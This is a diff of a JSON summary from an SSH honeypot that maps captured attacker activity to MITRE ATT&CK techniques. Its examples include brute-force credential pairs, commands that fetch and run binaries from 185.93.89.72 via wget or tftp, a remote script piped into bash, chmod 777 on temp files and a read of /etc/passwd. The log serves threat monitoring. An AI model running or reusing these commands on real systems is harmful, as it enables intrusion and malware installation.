@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-12 06:02:38",
+  "generated": "2026-09-12 07:02:38",
   "totals": {
-    "commands": 227,
-    "login_failed": 1215,
-    "login_success": 62,
-    "sessions": 1346
+    "commands": 250,
+    "login_failed": 1259,
+    "login_success": 68,
+    "sessions": 1402
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1215,
+      "count": 1259,
       "examples": [
         "admin / 150580",
         "admin / 150488",
@@ -21,14 +21,14 @@
         "root / casa"
       ],
       "first": "2026-09-12T00:01:39.148725Z",
-      "last": "2026-09-12T06:02:17.663828Z",
-      "unique_ips": 31
+      "last": "2026-09-12T06:53:51.267114Z",
+      "unique_ips": 35
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 62,
+      "count": 68,
       "examples": [
         "root / root",
         "root / xmhdipc",
@@ -37,14 +37,14 @@
         "root / 123@@@"
       ],
       "first": "2026-09-12T00:08:14.272082Z",
-      "last": "2026-09-12T05:52:50.248734Z",
-      "unique_ips": 20
+      "last": "2026-09-12T06:54:42.689903Z",
+      "unique_ips": 24
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 19,
+      "count": 20,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -53,14 +53,14 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T05:53:07.456562Z",
-      "unique_ips": 4
+      "last": "2026-09-12T06:38:29.448025Z",
+      "unique_ips": 5
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 16,
+      "count": 17,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -69,8 +69,8 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-12T00:08:17.167446Z",
-      "last": "2026-09-12T03:58:37.332000Z",
-      "unique_ips": 2
+      "last": "2026-09-12T06:38:29.448025Z",
+      "unique_ips": 3
     },
     {
       "id": "T1083",
@@ -100,28 +100,29 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 7,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-12T00:41:33.686577Z",
-      "last": "2026-09-12T03:58:37.332000Z",
-      "unique_ips": 5
+      "last": "2026-09-12T06:54:56.187406Z",
+      "unique_ips": 6
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
       ],
       "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T03:58:37.332000Z",
-      "unique_ips": 2
+      "last": "2026-09-12T06:38:29.002804Z",
+      "unique_ips": 3
     },
     {
       "id": "T1059.004",
@@ -146,24 +147,36 @@
       "first": "2026-09-12T03:58:37.332000Z",
       "last": "2026-09-12T03:58:37.332000Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-12T06:38:29.007342Z",
+      "last": "2026-09-12T06:38:29.007342Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "shell",
-      45
+      48
     ],
     [
       "sh",
-      45
+      48
     ],
     [
       "system",
-      33
+      34
     ],
     [
       "/bin/busybox LZRD",
-      12
+      14
     ],
     [
       "sh .k",
@@ -174,12 +187,12 @@
       8
     ],
     [
-      "/bin/busybox",
+      "enable",
       4
     ],
     [
-      "enable",
-      3
+      "/bin/busybox",
+      4
     ],
     [
       "linuxshell",
